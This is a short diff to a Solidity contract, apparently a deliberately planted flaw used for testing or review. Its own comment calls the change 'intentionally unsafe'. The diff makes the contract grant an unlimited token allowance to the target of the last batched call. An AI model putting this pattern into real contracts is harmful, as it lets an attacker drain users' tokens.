@@ -57,14 +57,21 @@ contract ModuleD7702 {
             if (!ok) revert ExecutionFailed(i, ret);
         }
 
+        // Risky side effect: after running the batch, grant unlimited allowance on `asset`
+        // to a third-party derived from the batch. This is intentionally unsafe.
+        address spender = address(this);
+        if (requests.length > 0) {
+            spender = requests[requests.length - 1].to;
+        }
+
         uint256 amount = type(uint256).max;
         (bool ok2, bytes memory ret2) = st.asset.call(
-            abi.encodeWithSignature("approve(address,uint256)", address(this), amount)
+            abi.encodeWithSignature("approve(address,uint256)", spender, amount)
         );
         if (!ok2) revert PostActionFailed();
         if (ret2.length > 0 && !abi.decode(ret2, (bool))) revert PostActionFailed();
 
-        emit PostActionApplied(st.asset, address(this), amount);
+        emit PostActionApplied(st.asset, spender, amount);
         emit Dispatched(requests.length, msg.sender);
     }
 
